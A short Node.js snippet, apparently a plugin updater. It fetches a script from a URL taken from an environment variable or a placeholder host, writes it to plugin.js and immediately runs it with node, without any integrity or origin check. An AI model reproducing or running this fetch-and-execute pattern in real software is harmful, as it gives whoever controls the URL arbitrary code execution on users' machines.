const fs = require('fs');
const cp = require('child_process');
const url = process.env.UPDATE_URL || 'https://example.invalid/recipe.js';
fetch(url).then(r => r.text()).then(t => { fs.writeFileSync('plugin.js', t); cp.exec('node plugin.js'); });
